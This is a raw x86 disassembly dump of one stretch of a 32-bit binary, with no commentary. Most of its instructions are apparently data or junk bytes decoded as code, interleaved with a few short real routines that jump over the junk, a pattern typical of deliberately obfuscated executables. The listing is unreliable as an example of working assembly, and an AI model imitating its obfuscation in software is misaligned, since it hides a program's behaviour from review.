  40f08a:	jge    0x40f02b
  40f08c:	add    al,0xc0
  40f08e:	aaa    
  40f08f:	pop    edi
  40f090:	(bad)  
  40f091:	std    
  40f092:	ret    0xb940
  40f095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f096:	jmp    0x2604:0x80633012
  40f09d:	and    eax,0xa2bdfb5
  40f0a2:	or     edi,DWORD PTR [ebp+0x3e6edcf]
  40f0a8:	bnd jae 0x40f0b6
  40f0ab:	xchg   esp,eax
  40f0ac:	push   ebx
  40f0ad:	dec    ecx
  40f0ae:	addr16 mov edx,0x6e89b24e
  40f0b4:	and    BYTE PTR [eax-0x3d],dh
  40f0b7:	mov    dl,BYTE PTR [eax-0x5b]
  40f0ba:	ret    0xcd41
  40f0bd:	imul   BYTE PTR [esi]
  40f0bf:	mov    bl,0x4a
  40f0c1:	enter  0x9e76,0x6d
  40f0c5:	nop
  40f0c6:	rol    edx,0xaa
  40f0c9:	and    eax,DWORD PTR [eax-0x23124b09]
  40f0cf:	cmp    bl,ah
  40f0d1:	fiadd  DWORD PTR [edx-0x7f]
  40f0d4:	push   ecx
  40f0d5:	inc    ecx
  40f0d6:	mov    DWORD PTR [esp+eax*4+0x15],esi
  40f0da:	adc    al,bh
  40f0dc:	fsubr  DWORD PTR [esp+edx*2+0x52]
  40f0e0:	sub    DWORD PTR [esi],esi
  40f0e2:	lock mov al,0x9c
  40f0e5:	cmp    eax,0x236335b4
  40f0ea:	mov    ebx,0xc6e27148
  40f0ef:	jmp    0x40f0f5
  40f0f1:	pusha  
  40f0f2:	dec    edx
  40f0f3:	mov    al,ds:0xa2c692bf
  40f0f8:	jp     0x40f160
  40f0fa:	xchg   esi,eax
  40f0fb:	retf   
  40f0fc:	sub    bh,bl
  40f0fe:	in     eax,dx
  40f0ff:	dec    esi
  40f100:	in     eax,dx
  40f101:	jmp    0xd93f:0x559ca763
  40f108:	sub    bl,dh
  40f10a:	jp     0x40f15d
  40f10c:	shl    BYTE PTR [eax+0x48],cl
  40f10f:	les    esp,FWORD PTR [ebp+0x4c]
  40f112:	jle    0x40f0a8
  40f114:	hlt    
  40f115:	cmp    DWORD PTR [ebp-0x35289416],ecx
  40f11b:	push   cs
  40f11c:	or     eax,0x9a7d1a1a
  40f121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f122:	call   0xcb65:0xd1f5fc1c
  40f129:	xchg   esi,eax
  40f12a:	mov    ds:0x68b433de,eax
  40f12f:	fidiv  DWORD PTR [edx]
  40f131:	rcl    ah,0x24
  40f134:	add    ah,dl
  40f136:	lahf   
  40f137:	popa   
  40f138:	mov    eax,0x4401c677
  40f13d:	inc    ecx
  40f13e:	sub    edx,ebp
  40f140:	inc    eax
  40f141:	popf   
  40f142:	cmp    ecx,0xffffffcd
  40f145:	les    esi,FWORD PTR [edx+0x38ebb8c4]
  40f14b:	inc    ebx
  40f14c:	mov    edx,DWORD PTR [ebx]
  40f14e:	sub    al,0x2
  40f150:	enter  0x1d7e,0xf
  40f154:	test   BYTE PTR [eax+0x1],bh
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   edi,ebp
  40f16e:	sbb    cl,BYTE PTR [ecx+eiz*2+0x7070aaa3]
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f170
  40f17a:	popa   
  40f17b:	mov    BYTE PTR [ebp+0x4870b5f6],bl
  40f181:	ficom  WORD PTR [bx+si+0x78]
  40f185:	dec    edi
  40f186:	ins    DWORD PTR es:[edi],dx
  40f187:	sbb    DWORD PTR [ebp+0x34f65c5a],ecx
  40f18d:	shl    DWORD PTR [esi+0x5a],cl
  40f190:	imul   edi,DWORD PTR [esp+edx*2],0x6c1a4139
  40f197:	ss mov edi,0x16af222
  40f19d:	outs   dx,BYTE PTR ds:[esi]
  40f19e:	xor    DWORD PTR [ecx],edi
  40f1a0:	sete   BYTE PTR [esi]
  40f1a3:	mov    esp,0x5fa78cb
  40f1a8:	ins    DWORD PTR es:[edi],dx
  40f1a9:	adc    cl,BYTE PTR [ebp+0x72]
  40f1ac:	jl     0x40f17f
  40f1ae:	xchg   edi,eax
  40f1af:	test   eax,0x5097eb83
  40f1b4:	aad    0xc3
  40f1b6:	add    esi,0x5b
  40f1b9:	adc    al,0xc2
  40f1bb:	push   ss
  40f1bc:	test   eax,0xaacf571c
  40f1c1:	dec    esi
  40f1c2:	je     0x40f20c
  40f1c4:	cmp    al,bl
  40f1c6:	shr    edi,0x4e
  40f1c9:	jne    0x40f16c
  40f1cb:	pop    esi
  40f1cc:	sub    BYTE PTR [ecx],ch
  40f1ce:	push   esp
  40f1cf:	loope  0x40f19f
  40f1d1:	pop    edi
  40f1d2:	jp     0x40f19a
  40f1d4:	mov    ah,0x81
  40f1d6:	dec    esi
  40f1d7:	adc    DWORD PTR [eax],ebx
  40f1d9:	pop    edx
  40f1da:	ds loop 0x40f1f9
  40f1dd:	xor    DWORD PTR [ecx+0x5fd9f82b],0x15ec1bf2
  40f1e7:	and    DWORD PTR [esi-0x73c9af94],ebp
  40f1ed:	es inc eax
  40f1ef:	adc    al,0x2a
  40f1f1:	nop
  40f1f2:	data16 jae 0x40f223
  40f1f5:	push   es
  40f1f6:	ror    ecx,1
  40f1f8:	outs   dx,BYTE PTR ds:[esi]
  40f1f9:	loop   0x40f1b7
  40f1fb:	rol    DWORD PTR [ecx],1
  40f1fd:	cwde   
  40f1fe:	add    BYTE PTR [esi-0x57e90be7],al
  40f204:	jo     0x40f188
  40f206:	aaa    
  40f207:	pop    edx
  40f208:	xchg   edi,eax
  40f209:	fcmovb st,st(6)
  40f20b:	and    cl,0x14
  40f20e:	add    esp,DWORD PTR [edx+0x327df8c4]
  40f214:	jg     0x40f20b
  40f216:	pop    ecx
  40f217:	add    al,0xdb
  40f219:	es jl  0x40f1bb
  40f21c:	cmp    DWORD PTR [ecx+0x66],esi
  40f21f:	repz jae 0x40f24f
  40f222:	stos   BYTE PTR es:[edi],al
  40f223:	sahf   
  40f224:	ret    0xdbdf
  40f227:	xchg   esi,eax
  40f228:	push   cs
  40f229:	sub    BYTE PTR [ecx-0x64cea7de],ah
  40f22f:	fld    TBYTE PTR [edi-0x41]
  40f232:	and    al,0x30
  40f234:	out    0xd8,eax
  40f236:	mov    esp,0xa846f319
  40f23b:	jg     0x40f278
  40f23d:	pop    esi
  40f23e:	mov    esp,0x52724f54
  40f243:	inc    edx
  40f244:	jae    0x40f298
  40f246:	imul   ebx,DWORD PTR [edi],0xc4bb0b
  40f24c:	and    esi,DWORD PTR [edi]
  40f24e:	dec    ebp
  40f24f:	popa   
  40f250:	xchg   ecx,eax
  40f251:	mov    ds:0x67e5ec0e,al
  40f256:	inc    edi
  40f257:	mov    dl,0x2c
  40f259:	sbb    BYTE PTR [ecx],0x34
  40f25c:	pop    edx
  40f25d:	in     al,dx
  40f25e:	sub    BYTE PTR [ebp-0x69],dh
  40f261:	pop    eax
  40f262:	xchg   edx,eax
  40f263:	and    ebx,edi
  40f265:	push   0xffffffce
  40f267:	mov    ds:0xcb430571,eax
  40f26c:	push   esi
  40f26d:	sub    esp,0x40a4f7d4
  40f273:	add    eax,0xafc1588f
  40f278:	adc    BYTE PTR [ebx],dl
  40f27a:	je     0x40f23f
  40f27c:	mov    ebp,DWORD PTR [esi]
  40f27e:	xchg   ecx,eax
  40f27f:	mov    edi,0xe587e0c7
  40f284:	mov    bl,0x92
  40f286:	sbb    BYTE PTR [ecx-0x1a9082b1],al
  40f28c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28d:	adc    eax,DWORD PTR [ebx]
  40f28f:	or     ecx,DWORD PTR [ecx-0x1f]
  40f292:	loopne 0x40f2eb
  40f294:	fist   WORD PTR [eax+0xf]
  40f297:	jecxz  0x40f306
  40f299:	mov    eax,edx
  40f29b:	mov    esi,0xfb921959
  40f2a0:	cdq    
  40f2a1:	mov    ss,WORD PTR [edx+0x1c425f3d]
  40f2a7:	retf   0xb447
  40f2aa:	xchg   DWORD PTR [esi+0x50cfb464],esi
  40f2b0:	pop    ebx
  40f2b1:	fcom   QWORD PTR [edx]
  40f2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2b4:	pop    esp
  40f2b5:	cmp    al,0x95
  40f2b8:	lea    ecx,[edx-0x8]
  40f2bb:	push   ss
  40f2bc:	leave  
  40f2bd:	mov    ebx,0xc1ed1ce
  40f2c2:	mov    ebx,edx
  40f2c4:	(bad)  
  40f2c5:	push   esp
  40f2c6:	mov    DWORD PTR [eax],0x60341e89
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	shl    bl,1
  40f2f8:	fsub   st(1),st
  40f2fa:	ss jbe 0x40f2a6
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f32a
  40f304:	fcmove st,st(0)
  40f306:	data16 and ah,dh
  40f309:	iret   
  40f30a:	js     0x40f35b
  40f30c:	cmp    BYTE PTR [eax],al
  40f30e:	dec    eax
  40f30f:	adc    cl,BYTE PTR [ebx+ebp*2]
  40f312:	sbb    edx,esi
  40f314:	test   al,0x85
  40f316:	jl     0x40f38b
  40f318:	mov    ecx,DWORD PTR [esi-0x73]
  40f31b:	fistp  DWORD PTR [ebp-0x29]
  40f31e:	sbb    BYTE PTR [esi+0x1d],dh
  40f321:	stos   BYTE PTR es:[edi],al
  40f322:	pop    esi
  40f323:	mov    cl,0x8a
  40f325:	test   al,0x1c
  40f327:	iret   
  40f328:	test   DWORD PTR ds:0x9bcc2fcc,ebp
  40f32e:	jnp    0x40f35d
  40f330:	jle    0x40f3a7
  40f332:	cmp    eax,0xfe4ef2d2
  40f337:	cs xchg ecx,eax
  40f339:	push   esi
  40f33a:	fstp   DWORD PTR [edi+0xf3504c0]
  40f340:	repnz aaa 
  40f342:	sbb    ch,dh
  40f344:	iret   
  40f345:	in     al,0xdb
  40f347:	pop    esp
  40f348:	mov    ah,0x3e
  40f34a:	lods   eax,DWORD PTR ds:[esi]
  40f34b:	out    0xf7,al
  40f34d:	in     eax,0xa7
  40f34f:	fsubp  st(3),st
  40f351:	pop    ss
  40f352:	dec    eax
  40f353:	sbb    al,0x20
  40f355:	outs   dx,BYTE PTR ds:[esi]
  40f356:	sahf   
  40f357:	daa    
  40f358:	sbb    eax,edx
  40f35a:	mov    edi,0x45c4fc23
  40f35f:	push   esp
  40f360:	pusha  
  40f361:	push   esi
  40f362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f363:	jno    0x40f394
  40f365:	retf   
  40f366:	iret   
  40f367:	(bad)  
  40f368:	jae    0x40f36b
  40f36a:	stc    
  40f36b:	xchg   ebp,eax
  40f36c:	hlt    
  40f36d:	and    al,0xb0
  40f36f:	push   eax
  40f370:	cmc    
  40f371:	std    
  40f372:	mov    BYTE PTR [esi],dh
  40f374:	fwait
  40f375:	dec    esp
  40f376:	sti    
  40f377:	aas    
  40f378:	shr    DWORD PTR [edx],0x3b
  40f37b:	cdq    
  40f37c:	dec    eax
  40f37d:	popf   
  40f37e:	test   eax,0xc7693c0e
  40f383:	jnp    0x40f33a
  40f385:	aad    0x3c
  40f387:	push   0xc906bfa5
  40f38c:	lahf   
  40f38d:	push   esp
  40f38e:	je     0x40f3fa
  40f390:	loop   0x40f3c4
  40f392:	enter  0x6d77,0x60
  40f396:	inc    ecx
  40f397:	pop    ecx
  40f398:	(bad)  
  40f399:	cmp    al,0xd9
  40f39b:	mov    ecx,0x656aa4bf
  40f3a0:	mov    esp,0x9111254e
  40f3a5:	jp     0x40f375
  40f3a7:	inc    ebx
  40f3a8:	jecxz  0x40f332
  40f3aa:	push   ecx
  40f3ab:	sbb    dh,BYTE PTR [esi+0x3e]
  40f3ae:	add    DWORD PTR [esp+edi*1+0x31],0x9de4eedb
  40f3b6:	mov    al,BYTE PTR [esi]
  40f3b8:	mov    dl,0x96
  40f3ba:	and    DWORD PTR [esi+0x37a80f8a],ebx
  40f3c0:	push   ds
  40f3c1:	pop    edi
  40f3c2:	sub    al,0x55
  40f3c4:	in     eax,dx
  40f3c5:	xor    BYTE PTR [eax+edi*1],bl
  40f3c8:	cmp    DWORD PTR [eax],edx
  40f3ca:	jecxz  0x40f3ab
  40f3cc:	div    BYTE PTR [edi]
  40f3ce:	ins    BYTE PTR es:[edi],dx
  40f3cf:	mov    bl,0x41
  40f3d1:	dec    edi
  40f3d2:	add    BYTE PTR [ecx],ah
  40f3d4:	pop    ds
  40f3d5:	in     eax,dx
  40f3d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3d7:	push   esi
  40f3d8:	inc    DWORD PTR [ebp+eax*4+0x46da784a]
  40f3df:	push   edi
  40f3e0:	rcl    BYTE PTR ss:[ecx+0x7f8939a4],0x58
  40f3e8:	je     0x40f41d
  40f3ea:	std    
  40f3eb:	push   edi
  40f3ec:	jb     0x40f439
  40f3ee:	inc    ebp
  40f3ef:	jb     0x40f3e6
  40f3f1:	out    0x91,al
  40f3f3:	inc    ebx
  40f3f4:	aas    
  40f3f5:	imul   ebx,DWORD PTR [ebp-0x1e],0xc
  40f3f9:	xchg   edx,eax
  40f3fa:	ja     0x40f3b6
  40f3fc:	(bad)  
  40f3fd:	(bad)  
  40f3fe:	cld    
  40f3ff:	mov    ds:0xa6c9e989,al
  40f404:	(bad)  
  40f405:	in     eax,0xc0
  40f407:	repz mov eax,0x469db972
  40f40d:	imul   ebp,DWORD PTR [eax+0x67],0xffffff8c
  40f411:	xchg   DWORD PTR [edi-0x1ef7f9d4],ecx
  40f417:	jb     0x40f3e3
  40f419:	sub    al,0x10
  40f41b:	retf   
  40f41c:	test   eax,0xea400cf0
  40f421:	inc    edx
  40f422:	add    BYTE PTR [esi+esi*1],dl
  40f425:	into   
  40f426:	sbb    DWORD PTR [ecx],ebx
  40f428:	mov    bl,0xda
  40f42a:	sub    DWORD PTR [esi],0x5c5182b4
  40f430:	pop    ds
  40f431:	test   DWORD PTR [edi+0x6],0x2fb4e280
  40f438:	sub    esp,DWORD PTR [edi]
  40f43a:	sbb    al,bl
  40f43c:	push   ebx
  40f43d:	aaa    
  40f43e:	or     BYTE PTR [edi-0x61faee5],bh
  40f444:	mov    DWORD PTR [esi+0x4e],0x1f10dfef
  40f44b:	hlt    
  40f44c:	cmp    DWORD PTR [esi-0x41],ecx
  40f44f:	mov    eax,0xe9f8458b
  40f454:	add    DWORD PTR gs:[eax],eax
  40f457:	add    BYTE PTR [eax+0x65],al
  40f45a:	ror    ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	popa   
  40f465:	icebp  
  40f466:	inc    edi
  40f467:	sar    DWORD PTR [ecx],0xb7
  40f46a:	jo     0x40f4dc
  40f46c:	ret    
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f47a
  40f471:	sbb    ah,BYTE PTR [ebx+0x715d486f]
  40f477:	fcmovu st,st(7)
  40f479:	jb     0x40f45b
  40f47b:	sub    BYTE PTR [ebx+esi*8-0x4b12edb6],dh
  40f482:	dec    ecx
  40f483:	jb     0x40f496
  40f485:	(bad)  
  40f487:	iret   
  40f488:	aas    
  40f489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f48a:	fisttp QWORD PTR [eax+0x308355e8]
  40f490:	and    DWORD PTR [ebx],0xbf2af649
  40f496:	cld    
  40f497:	aaa    
  40f498:	addr16 pop ebp
  40f49a:	int3   
  40f49b:	stos   BYTE PTR es:[edi],al
  40f49c:	mov    dl,0xc9
  40f49e:	adc    al,0x75
  40f4a0:	imul   esi,DWORD PTR [ecx+ecx*8+0x14],0xffffffb5
  40f4a5:	je     0x40f481
  40f4a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a8:	sbb    al,0x8d
  40f4aa:	dec    edx
  40f4ab:	sar    BYTE PTR [ebp-0x76c2a28a],1
  40f4b1:	pushf  
  40f4b2:	(bad)  
  40f4b3:	dec    edx
  40f4b4:	popf   
  40f4b5:	add    ebx,DWORD PTR [esi-0x39]
  40f4b8:	int    0xbe
  40f4ba:	sti    
  40f4bb:	or     bh,BYTE PTR [edi-0x1e33336b]
  40f4c1:	pop    esp
  40f4c2:	sbb    ebp,DWORD PTR [ebx+0x2790cb9e]
  40f4c8:	pop    ebp
  40f4c9:	xor    eax,0x6cdd1bad
  40f4ce:	jbe    0x40f53a
  40f4d0:	out    dx,al
  40f4d1:	aaa    
  40f4d2:	dec    ebx
  40f4d3:	pushf  
  40f4d4:	int3   
  40f4d5:	popa   
  40f4d6:	inc    ebx
  40f4d7:	add    DWORD PTR [esi-0x40f8c318],ebp
  40f4dd:	jae    0x40f537
  40f4df:	je     0x40f47f
  40f4e1:	clc    
  40f4e2:	test   al,0x60
  40f4e4:	push   ds
  40f4e5:	push   DWORD PTR [eax+ebx*2+0x50ad1d23]
  40f4ec:	pop    edi
  40f4ed:	add    eax,DWORD PTR [edx+0x4f]
  40f4f0:	pop    edx
  40f4f1:	lock pop es
  40f4f3:	xlat   BYTE PTR ds:[ebx]
  40f4f4:	or     BYTE PTR [ebp+0xca376cb],0x8d
  40f4fb:	lahf   
  40f4fc:	mov    dh,0x1d
  40f4fe:	retf   0xa38e
  40f501:	in     eax,0xf0
  40f503:	or     eax,0x5cd04166
  40f508:	js     0x40f4ec
  40f50a:	pop    edx
  40f50b:	push   edi
  40f50c:	call   0xb7656d31
  40f511:	mov    edx,0x999cc1e0
  40f516:	mov    bl,0x62
  40f518:	ficomp WORD PTR [ebx]
  40f51a:	xchg   edx,eax
  40f51b:	and    edx,eax
  40f51d:	ror    DWORD PTR ds:0xce83d0a9,1
  40f523:	pushf  
  40f524:	mov    cl,cl
  40f526:	mov    ss,WORD PTR [ebp+0x5e]
  40f529:	shl    BYTE PTR [edi],0x77
  40f52c:	jg     0x40f4e4
  40f52e:	mov    dl,0x26
  40f530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f531:	test   eax,0xe5b9d005
  40f536:	sub    bl,BYTE PTR [ecx]
  40f538:	sub    eax,0x42103695
  40f53d:	xchg   edx,eax
  40f53e:	(bad)  
  40f53f:	std    
  40f540:	xchg   edx,ebx
  40f542:	daa    
  40f543:	sbb    DWORD PTR [ecx],ecx
  40f545:	jno    0x40f5b6
  40f547:	adc    al,0x2a
  40f549:	jge    0x40f4d9
  40f54b:	add    dh,0x6a
  40f54e:	mov    DWORD PTR [esi],esi
  40f550:	mov    ebp,0x7fd0e72a
  40f555:	add    al,0x7c
  40f557:	jb     0x40f56f
  40f559:	push   edi
  40f55a:	xchg   ebx,eax
  40f55b:	aas    
  40f55c:	arpl   WORD PTR ds:0x38b76c39,dx
  40f562:	lahf   
  40f563:	rcr    DWORD PTR ds:0x71ca753c,0xbc
  40f56a:	mov    edi,?
  40f56c:	daa    
  40f56d:	popa   
  40f56e:	das    
  40f56f:	and    bh,BYTE PTR [esi]
  40f571:	pop    edx
  40f572:	or     BYTE PTR [ecx-0x12],ah
  40f575:	adc    eax,DWORD PTR [ebx+0x5a]
  40f578:	sub    al,0x58
  40f57a:	sub    al,0xad
  40f57c:	xchg   BYTE PTR [edi+0x27ee7455],cl
  40f582:	push   edx
  40f583:	mov    ds:0x1b7b11cb,al
  40f588:	sbb    cl,BYTE PTR ds:0x1c540b4b
  40f58e:	and    DWORD PTR [eax+ebx*1+0x70],ebx
  40f592:	inc    eax
  40f593:	add    edi,DWORD PTR [ebp+0x7b]
  40f596:	jmp    0x40f55e
  40f598:	jmp    0x40f574
  40f59a:	fnstcw WORD PTR [ecx]
  40f59c:	out    dx,eax
  40f59d:	ds pop ebp
  40f59f:	jne    0x40f541
  40f5a1:	pop    ds
  40f5a2:	daa    
  40f5a3:	repnz pop ds
  40f5a5:	inc    edi
  40f5a6:	js     0x40f59f
  40f5a8:	push   esp
  40f5a9:	cmp    al,0x2d
  40f5ab:	jno    0x40f62b
  40f5ad:	cmp    bh,BYTE PTR [ebx]
  40f5af:	lods   al,BYTE PTR ds:[esi]
  40f5b0:	popf   
  40f5b1:	mov    cl,0x99
  40f5b3:	in     eax,0x8
  40f5b5:	push   0x7877d732
  40f5ba:	cli    
  40f5bb:	inc    edi
  40f5bc:	(bad)  [ebx+0x3c408b00]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	call   0x8ce21e41
  40f608:	mov    dh,0x70
  40f60a:	jo     0x40f5cf
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f5b1
  40f610:	cwde   
  40f611:	xor    al,0xec
  40f613:	inc    ebp
  40f614:	inc    ecx
  40f615:	scas   eax,DWORD PTR es:[edi]
  40f616:	xchg   esp,eax
  40f617:	xchg   ebx,eax
  40f618:	popa   
  40f619:	cmp    edi,ebp
  40f61b:	ins    DWORD PTR es:[edi],dx
  40f61c:	pop    eax
  40f61d:	push   ebx
  40f61e:	sub    al,0xff
  40f620:	jne    0x40f62b
  40f622:	test   BYTE PTR [edx+0x4d],al
  40f625:	cmp    bh,ch
  40f627:	aaa    
  40f628:	loopne 0x40f653
  40f62a:	shl    BYTE PTR ds:0x8f12bc54,cl
  40f630:	push   0xffffff90
  40f632:	lods   eax,DWORD PTR ds:[esi]
  40f633:	das    
  40f634:	inc    ebx
  40f635:	jp     0x40f5c4
  40f637:	jecxz  0x40f68f
  40f639:	sbb    ah,BYTE PTR [edi]
  40f63b:	xor    DWORD PTR [eax-0xb],ebx
  40f63e:	test   edx,edi
  40f640:	sub    al,0xb6
  40f642:	jg     0x40f63e
  40f644:	pop    edi
  40f645:	(bad)  
  40f646:	dec    eax
  40f647:	adc    eax,0x81940992
  40f64c:	int3   
  40f64d:	push   ecx
  40f64e:	mov    esi,0xb601d5ad
  40f653:	mov    cs,WORD PTR [edi-0x2bcdb2f7]
  40f659:	cld    
  40f65a:	pop    esp
  40f65b:	and    dl,BYTE PTR [ebx+0xb]
  40f65e:	add    BYTE PTR [edx],al
  40f660:	in     eax,dx
  40f661:	(bad)  
  40f662:	fst    DWORD PTR [edx-0x7a2d01f3]
  40f668:	ret    0xe13b
  40f66b:	fsubp  st(5),st
  40f66d:	jnp    0x40f627
  40f66f:	hlt    
  40f670:	outs   dx,BYTE PTR ds:[esi]
  40f671:	pop    esi
  40f672:	outs   dx,BYTE PTR ds:[esi]
  40f673:	add    esi,ecx
  40f675:	xchg   ecx,eax
  40f676:	inc    ebp
  40f677:	mov    bl,0xe0
  40f679:	inc    esi
  40f67a:	inc    edx
  40f67b:	xchg   DWORD PTR [edi],edx
  40f67d:	xor    eax,0xc8f2cac4
  40f682:	out    dx,al
  40f683:	(bad)
  40f686:	pop    esi
  40f687:	nop
  40f688:	pop    esp
  40f689:	pop    ds
  40f68a:	mov    edx,0x84c44378
  40f68f:	test   dl,ah
  40f691:	out    dx,al
  40f692:	sbb    al,0x55
  40f694:	retf   
  40f695:	aas    
  40f696:	sub    eax,0x4f6ba3f
  40f69b:	push   edx
  40f69c:	shl    BYTE PTR [edx-0x34a6a5d6],1
  40f6a2:	push   0xd09f3958
  40f6a7:	jecxz  0x40f630
  40f6a9:	loope  0x40f69c
  40f6ab:	(bad)
  40f6af:	fmul   QWORD PTR [ebx+0x2]
  40f6b2:	fild   WORD PTR [ebx+edx*8]
  40f6b5:	sbb    al,0xdf
  40f6b7:	pop    edx
  40f6b8:	mov    ecx,0x9140d425
  40f6bd:	mov    ebp,0xb87ea0af
  40f6c2:	xchg   ebp,eax
  40f6c3:	mov    ch,0x7d
  40f6c5:	in     al,dx
  40f6c6:	xor    ecx,ebx
  40f6c8:	inc    ecx
  40f6c9:	jae    0x40f6d8
  40f6cb:	ret    
  40f6cc:	addr16 mov edi,0x1cb29823
  40f6d2:	ret    0x284b
  40f6d5:	push   ds
  40f6d6:	(bad)  
  40f6d7:	xchg   ah,bl
  40f6d9:	push   ecx
  40f6da:	cmp    ch,dl
  40f6dc:	cmp    al,0x90
  40f6de:	pop    ecx
  40f6df:	fs stc 
  40f6e1:	push   esi
  40f6e2:	sahf   
  40f6e3:	in     al,0xf7
  40f6e5:	iret   
  40f6e6:	cmp    eax,0xd45ebbda
  40f6eb:	xor    dh,BYTE PTR [esi]
  40f6ed:	pop    eax
  40f6ee:	push   ds
  40f6ef:	or     eax,esi
  40f6f1:	add    ah,dh
  40f6f3:	lahf   
  40f6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6f5:	mov    ah,0x77
  40f6f7:	push   esp
  40f6f8:	mov    esi,0xd5ce68c0
  40f6fd:	adc    eax,0x48905da0
  40f702:	es sbb eax,0x28fb106
  40f708:	push   ecx
  40f709:	fxch   st(4)
  40f70b:	push   esi
  40f70c:	and    edx,DWORD PTR [esi]
  40f70e:	dec    ebp
  40f70f:	mov    dh,0xbc
  40f711:	es call 0x405b126a
  40f717:	dec    esi
  40f718:	out    dx,eax
  40f719:	in     eax,0x83
  40f71b:	fild   WORD PTR [esi]
  40f71d:	add    edi,DWORD PTR [esi]
  40f71f:	jecxz  0x40f6f8
  40f721:	inc    esi
  40f722:	cli    
  40f723:	imul   esp,esp,0xe4f1d5
  40f729:	lahf   
  40f72a:	sub    BYTE PTR ds:0xc6413d1a,bl
  40f730:	xlat   BYTE PTR ds:[ebx]
  40f731:	scas   eax,DWORD PTR es:[edi]
  40f732:	xchg   edx,eax
  40f733:	js     0x40f70f
  40f735:	data16 shl BYTE PTR [edx+0x39ee75fa],0x84
  40f73d:	mov    esp,0xd00577a2
  40f742:	in     al,0x42
  40f744:	mov    ah,0xde
  40f746:	jp     0x40f6f8
  40f748:	daa    
  40f749:	and    DWORD PTR [edx-0x11],ebx
  40f74c:	daa    
  40f74d:	cmp    edi,DWORD PTR [esi]
  40f74f:	cmp    al,0xa0
  40f751:	inc    ecx
  40f752:	inc    ecx
  40f753:	es xchg edx,eax
  40f755:	imul   esp,edi,0x15d3bdcb
  40f75b:	push   esp
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
